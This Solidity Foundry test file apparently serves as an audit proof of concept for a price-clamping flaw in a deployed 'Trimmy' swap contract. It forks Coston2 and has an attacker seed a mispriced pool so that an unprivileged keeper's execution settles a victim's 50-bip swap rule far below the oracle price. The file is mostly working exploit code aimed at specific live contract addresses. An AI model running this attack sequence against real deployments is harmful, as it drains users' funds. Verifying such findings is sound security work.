// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ISwapRouter, IFtsoV2} from "../../src/Interfaces.sol";
import {Trimmy} from "../../src/Trimmy.sol";
import {Quote} from "../../src/Quote.sol";

interface IV3Factory {
    function getPool(address a, address b, uint24 fee) external view returns (address);
    function createPool(address a, address b, uint24 fee) external returns (address);
}

interface IV3Pool {
    function initialize(uint160 sqrtPriceX96) external;
    function mint(
        address recipient,
        int24 tickLower,
        int24 tickUpper,
        uint128 amount,
        bytes calldata data
    ) external returns (uint256 amount0, uint256 amount1);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function slot0() external view returns (uint160, int24, uint16, uint16, uint16, uint8, bool);
}

interface IWNat {
    function deposit() external payable;
}

interface IRouterFactory {
    function factory() external view returns (address);
}

/// @title Adversarial verification of O-1/O-2 against the DEPLOYED contract, on a live fork.
/// @notice The claim under test: `Trimmy.sol:440` clamps the relative price into uint64, so the
///         only slippage floor the swap path has is ~10.7% of the FTSO's own fair value for the
///         deployed FXRP -> WC2FLR pair, and any address can take the difference.
///
///         This file does NOT use mocks for Trimmy, the oracle, the router, the factory or the
///         tokens. It forks Coston2 and drives 0xf73a2aF0…6554 itself with live FTSO reads.
contract VerifyO2DeployedTest is Test {
    address constant TRIMMY = 0xf73a2aF06B315adAA1afe2C1A6C1A6933d8A6554;
    address constant ROUTER = 0xe2B3aE21461c4ad3415210630EA210e9F53CCEBc;
    address constant FXRP = 0x0b6A3645c240605887a5532109323A3E12273dc7;
    address constant WC2FLR = 0xC67DCE33D7A8efA5FfEB961899C73fe01bCe9273;
    address constant FXRP_HOLDER = 0x9E63a5D282F2fBb7DcE822B98e363b2719D28319;

    bytes21 constant FEED_XRP = bytes21(uint168(0x015852502f55534400000000000000000000000000));
    bytes21 constant FEED_FLR = bytes21(uint168(0x01464c522f55534400000000000000000000000000));

    // Pool seeded ~10% above the CLAMPED floor price (18.4467 WC2FLR per FXRP), i.e. ~20.29.
    // The true oracle price is ~172.6. Constants derived in the accompanying calculation:
    //   raw ratio = 20.29141848108051e18 / 1e6 ; sqrtPriceX96 = floor(sqrt(raw) * 2**96)
    uint160 constant SQRT_PRICE_X96 = 356891157302962348862883904612204544;
    int24 constant TICK_LO = 300420;
    int24 constant TICK_HI = 312420;
    uint128 constant LIQUIDITY = 4e16;

    Trimmy trimmy = Trimmy(payable(TRIMMY));
    address factory;
    address pool;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victimPersonalAccount");
    address keeper = makeAddr("anyRandomKeeper");

    function setUp() public {
        vm.createSelectFork("coston2");
        factory = IRouterFactory(ROUTER).factory();
    }

    /// Uniswap V3 mint callback. The pool calls this on whoever called `mint`.
    function flareSwapMintCallback(uint256 owed0, uint256 owed1, bytes calldata) external {
        if (owed0 > 0) IERC20(FXRP).transfer(msg.sender, owed0);
        if (owed1 > 0) IERC20(WC2FLR).transfer(msg.sender, owed1);
    }

    /// The true, unclamped relative price, computed with the contract's OWN Quote library from a
    /// live FtsoV2 read at the forked block. Units: WC2FLR wei per one whole FXRP.
    function _trueRelative() internal returns (uint256) {
        IFtsoV2 ftso = trimmy.ftsoV2();
        Quote.Feed memory sell;
        Quote.Feed memory buy;
        (sell.value, sell.decimals, sell.timestamp) = ftso.getFeedById(FEED_XRP);
        (buy.value, buy.decimals, buy.timestamp) = ftso.getFeedById(FEED_FLR);
        console2.log("live XRP/USD mantissa:", sell.value);
        console2.log("live FLR/USD mantissa:", buy.value);
        return Quote.convert(1e6, sell, 6, buy, 18);
    }

    function _seedMispricedPool() internal {
        vm.prank(attacker);
        pool = IV3Factory(factory).createPool(FXRP, WC2FLR, 3000);
        assertEq(IV3Pool(pool).token0(), FXRP, "token0");
        assertEq(IV3Pool(pool).token1(), WC2FLR, "token1");
        IV3Pool(pool).initialize(SQRT_PRICE_X96);

        // Fund this contract to act as the LP (mint callback lives here).
        vm.prank(FXRP_HOLDER);
        IERC20(FXRP).transfer(address(this), 3_000e6);
        vm.deal(address(this), 200_000e18);
        IWNat(WC2FLR).deposit{value: 100_000e18}();

        IV3Pool(pool).mint(address(this), TICK_LO, TICK_HI, LIQUIDITY, "");
    }

    function _armVictimSwapRule() internal returns (uint256 id) {
        vm.prank(FXRP_HOLDER);
        IERC20(FXRP).transfer(victim, 100e6);
        vm.prank(victim);
        IERC20(FXRP).approve(TRIMMY, type(uint256).max);

        Trimmy.RuleParams memory p = Trimmy.RuleParams({
            sellTokenId: 0, // FXRP
            buyTokenId: 1, // WC2FLR
            verb: Trimmy.Verb.SWAP,
            venueId: 0, // the allowlisted SwapRouter
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: 100e6,
            partSellAmount: 100e6,
            minOutAbsolute: 0,
            triggerValue: 3600,
            expiry: uint64(block.timestamp + 30 days),
            slippageBips: 50, // the STRICTEST the contract permits
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
        vm.prank(victim);
        id = trimmy.arm(p);
    }

    // =================================================================================
    // THE PROOF
    // =================================================================================

    /// End to end on the deployed contract: a 50-bip rule settles at ~11.6% of the FTSO's own
    /// valuation, and `execute()` does not revert.
    function test_O2_deployedSwapSettlesAt89PercentBelowOracle() public {
        uint256 rel = _trueRelative();
        console2.log("true relative (WC2FLR wei per FXRP):", rel);
        console2.log("type(uint64).max                   :", uint256(type(uint64).max));
        assertGt(rel, type(uint64).max, "premise: live pair overflows uint64");

        _seedMispricedPool();
        uint256 id = _armVictimSwapRule();

        // Anyone. No relationship to the victim, no privilege.
        vm.prank(keeper);
        trimmy.execute(id);

        uint256 got = IERC20(WC2FLR).balanceOf(victim);
        uint256 fair = (100e6 * rel) / 1e6;
        uint256 declaredFloor = (fair * 9950) / 10_000;

        console2.log("fair value of 100 FXRP (wei WC2FLR):", fair);
        console2.log("victim actually received           :", got);
        console2.log("loss vs oracle, bips               :", 10_000 - (got * 10_000) / fair);

        assertEq(
            uint256(trimmy.ruleAt(id).latchedPrice),
            uint256(type(uint64).max),
            "latchedPrice stored the clamp, not the price"
        );

        // The rule's declared tolerance was 50 bips. This is the assertion that fails.
        assertGe(got, declaredFloor, "O-2: settled below the user's declared 50-bip floor");
    }

    /// Control: with a pool at the TRUE oracle price the same rule settles correctly, so the
    /// defect is the floor, not the plumbing.
    function test_O2_control_theFloorIsTheOnlyThingMissing() public {
        uint256 rel = _trueRelative();
        uint256 clamped = type(uint64).max;
        // The enforced floor for 100 FXRP, exactly as Trimmy.sol:466-468 computes it.
        uint256 enforcedFloor = ((100e6 * clamped) / 1e6 * 9950) / 10_000;
        uint256 correctFloor = ((100e6 * rel) / 1e6 * 9950) / 10_000;
        console2.log("floor Trimmy enforces:", enforcedFloor);
        console2.log("floor it should enforce:", correctFloor);
        console2.log("ratio x100:", (enforcedFloor * 100) / correctFloor);
        assertGe(enforcedFloor, correctFloor, "enforced floor is an order of magnitude too low");
    }
}
